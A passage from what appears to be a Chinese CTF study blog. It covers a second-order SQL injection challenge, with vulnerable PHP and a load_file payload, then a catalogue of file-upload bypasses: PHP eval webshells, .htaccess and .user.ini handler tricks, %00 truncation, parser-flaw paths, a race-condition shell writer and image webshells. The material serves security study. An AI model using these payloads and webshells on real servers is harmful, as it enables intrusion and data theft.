class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>旧字段的使用</strong>： 在更新操作中，<code>old_address</code>字段被设置为之前查询到的<code>address</code>字段的值，即<code>$row[&#39;address&#39;]</code>。这样，每次更新<code>address</code>时，旧的<code>address</code>值都会被保存到<code>old_address</code>字段中。</li>
</ul>
<p>所以就可以通过更改地址来进行二次注入</p>
<p>具体表现在：</p>
<p><img src="/img/lazy.gif" data-original="S1.png" alt=""></p>
<p>首先先注册（把注入代码放进第一次提交）</p>
<p>然后再更改地址：</p>
<p><img src="/img/lazy.gif" data-original="s2.png" alt=""></p>
<p>接着访问刚刚注册完成的订单：</p>
<p><img src="/img/lazy.gif" data-original="s3.png" alt=""></p>
<p>这样的话就可以爆出库名了</p>
<p>但是这题的flag在txt里，也算是脑洞题了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_name=ez&amp;phone=ez&amp;address=<span class="string">&#x27;,`address`=(select(load_file(&quot;/flag.txt&quot;)))#</span></span><br></pre></td></tr></table></figure>
<p>PS：打到一半靶机过期了…..尴尬</p>
<p>最终结果：</p>
<p><img src="/img/lazy.gif" data-original="s4.png" alt=""></p>
<h4 id="BUUCTF在线评测-二次注入"><a href="#BUUCTF在线评测-二次注入" class="headerlink" title="BUUCTF在线评测 二次注入"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#October 2019 Twice SQL Injection">BUUCTF在线评测</a> 二次注入</h4><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>1</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>2</p>
<hr>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_65165505/article/details/141370798#:~:text=在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。,将一个正常显示的图片，上传到服务器。 寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。">CTF show 文件上传篇（web151-170，看这一篇就够啦）-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html">【WEB】文件上传 | 狼组安全团队公开知识库</a></p>
<h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码</p>
<h3 id="普通php-phtml文件上传"><a href="#普通php-phtml文件上传" class="headerlink" title="普通php/phtml文件上传"></a>普通php/phtml文件上传</h3><p>直接上传一句话木马：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">GIF89</span>a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);&lt;/script&gt; </span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval ($_POST[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>然后直接带着URL+上传文件路径直接访问，然后蚁剑连接，密码就是a</p>
<h3 id="抓包更改后缀"><a href="#抓包更改后缀" class="headerlink" title="抓包更改后缀"></a>抓包更改后缀</h3><p><strong>服务端检测（MINE类型检测）</strong></p>
<blockquote>
<p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p>
</blockquote>
<p>服务器代码判断$_FILES <code>[”file“][&quot;type&quot;]</code> 是不是图片格式（<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>），如果不是，则不允许上传</p>
<p>这种类型的题目可以直接BP拦截然后将该文件Content-Type改成他接受的格式即可</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>如果发现上传文件源码是直接拼接一个后缀上去，例如 <code>&lt;file_name&gt;.&#39;.jpg&#39;</code>，或者只是对目标路径进行检测，看是否含 jpg 之类的，可以考虑 <code>%00</code> 截断（要是看不了源码也可以尝试截断）</p>
<p><code>00</code>代表结算符，能把后面的其他东西都删除，从而达到一个上传php文件的效果</p>
<p>（截断条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态）</p>
<p>例如上传文件shell.php，上传文件路径为/?upload=shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?upload=shell.php%00.jpg -&gt; /?upload=shell.php</span><br><span class="line"></span><br><span class="line">/111.php%00.gif/111.gif -&gt; /111.php</span><br></pre></td></tr></table></figure>
<h3 id="通过-htaccess或者user-ini进行文件上传"><a href="#通过-htaccess或者user-ini进行文件上传" class="headerlink" title="通过.htaccess或者user.ini进行文件上传"></a>通过.htaccess或者user.ini进行文件上传</h3><p><strong>.htaccess文件</strong>或者称为<strong>分布式配置文件</strong>，它是 Apache 服务器中的配置文件，提供了针对每个目录设置不同的配置的方法。有些服务器在上传认证时没有拦截.htaccess文件上传，就会造成恶意用户利用上传 .htaccess 文件解析漏洞，来绕过验证进行上传WEBShell</p>
<p>文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;a.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>这样你上传了a.jpg的文件，他会把此文件当作php解析</p>
<p><strong>.user.ini</strong> 是一个 PHP 专用的 <strong>目录级配置文件</strong>，自 PHP 5.3.0 引入，仅作用于 <strong>当前目录及其所有子目录</strong>（CGI/FastCGI 模式下生效）。它的工作方式类似 Apache 的 <strong>.htaccess</strong>，但只针对 PHP 解释器，不影响 Web 服务器本身。用户可以通过 <code>.user.ini</code> 文件来设置特定目录和子目录下的 PHP 配置。这些设置会覆盖全局 <code>php.ini</code> 的相应配置</p>
<p>文件内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png</span><br></pre></td></tr></table></figure>
<p>在访问主页文件时，会自动包含shell.png文件，将其文件内容当在php代码执行</p>
<p>步骤：先上传 <code>.user.ini</code> 文件，再上传shell.png，成功之后蚁剑连接，但注意URL不要带上shell.png，因为会自动包含进去</p>
<h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞</p>
<h4 id="目录解析"><a href="#目录解析" class="headerlink" title="目录解析"></a>目录解析</h4><p>服务器会把 <code>.asp</code> 和 <code>.asp</code>目录下的文件都解析成asp文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/xxx.asp/xxx.jpg</span><br></pre></td></tr></table></figure>
<h4 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h4><p>服务器默认不解析<code>;</code>后面的内容，因此<code>xxx.asp;jpg</code>被解析为<code>xxx.asp</code>文件了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/xxx.asp;.jpg</span><br></pre></td></tr></table></figure>
<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p>服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>
<p>常用后缀：<code>*.php</code> <code>*.php3</code> <code>*.php4</code> <code>*.php5</code> <code>*.phtml</code> <code>*.pht</code></p>
<p>它可以通过mod_php来运行PHP网页，在解析PHP时，<strong>1.php\x0A</strong>   (<strong>1.php%0A</strong>)   将被按照PHP后缀进行解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">DirectoryIndex disabled</span><br><span class="line">DirectoryIndex index.php index.html</span><br><span class="line"></span><br><span class="line">&lt;<span class="built_in">Directory</span> /<span class="keyword">var</span>/www&gt;</span><br><span class="line">	Options -Indexes </span><br><span class="line">	AllowOverride ALL</span><br><span class="line">&lt;/<span class="built_in">Directory</span>&gt;</span><br></pre></td></tr></table></figure>
<p>Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）,可用来绕过黑名单过滤</p>
<h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p>与Nginx、php版本无关，属于用户配置不当造成的解析漏洞</p>
<p><strong>cgi.fix_pathinfo</strong></p>
<p>该位于配置文件php.ini中，默认开启</p>
<p>当php遇到文件路径 <code>/test.png/x.php</code> 时，若 <code>/test.png/x.php</code> 不存在，则会去掉最后的 <code>/x.php</code>，然后判断 <code>/test.png</code></p>
<p>是否存在，若存在，则把 <code>/test.png</code>当做文件<code>/test.png/x.php</code> 解析，如若 <code>test.png</code> 还不存在如果在其前面还有后缀，继续前面的步骤，以此类推。若是关闭该选项，访问 <code>/test.jpg/x.php</code> 只会返回找不到文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com/UploadFiles/image/1.jpg/1.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/1.jpg%00.php www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</span><br></pre></td></tr></table></figure>
<h4 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞"></a>IIS7.5解析漏洞</h4><p>与Nginx类似</p>
<h3 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h3><p>一些网站上传文件的逻辑时先允许上传任意文件，然后检查上传文件的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击</p>
<p>先上传一个WebShell脚本1.php，1.php的内容为生成一个新的WebShell脚本shell.php，1.php写入如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;../shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>cmd<span class="string">&#x27;]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当1.php上传完成后，客立即访问1.php，会在服务端当前目录下自动生成shell.php，这时就利用了时间差完成了WebShell的上传</p>
<h3 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h3><p>适用于只对第一个上传的文件进行过滤，而对后面的文件不做过滤操作</p>
<p>本地POST上传文件：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://www.xxx.com/xxx.asp(php)&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form‐data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;FileName1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;FILE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;tx1&quot;</span> <span class="attr">size</span>=<span class="string">&quot;40&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;FileName2&quot;</span> <span class="attr">type</span>=<span class="string">&quot;FILE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;tx1&quot;</span> <span class="attr">size</span>=<span class="string">&quot;40&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后第一个上传的文件是允许类型，第二个文件上传php等即可</p>
<h3 id="ZIP压缩包传马"><a href="#ZIP压缩包传马" class="headerlink" title="ZIP压缩包传马"></a>ZIP压缩包传马</h3><p>直接将一句话木马写入压缩包即可（用文本编辑器写入）</p>
<h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><p>创建一个a.php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后在cmd.exe里，将gif文件和php文件合成为新的一张（ /b：二进制、 /a：追加 ）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy b.gif /b + a.php /a w.gif</span><br></pre></td></tr></table></figure>
<p><img src="/img/lazy.gif" data-original="tp1.png" alt=""></p>
<p>然后用NotePad++打开，就能发现被成功拼接了</p>
<p><img src="/img/lazy.gif" data-original="tp2.png" alt=""></p>
<p>上传图片马：</p>
<p>将2.jpg上传至服务器（如/upload/2.jpg）</p>
<p>构造URL：<code>http://127.0.0.1/include.php?file=upload/2.jpg</code></p>
<p>服务器解析2.jpg时执行隐藏的PHP代码。</p>
<p>使用蚁剑连接</p>
<h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>适用于对于上传的文件，有些网站会对图片进行二次处理（格式、尺寸等），服务器会把里面的内容进行替换更新，处理完成后，根据原有图片生成新的进行显示</p>
<p>（下载网站显示的图片，看看某些属性是否进行了变更）</p>
<p>类似环境源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
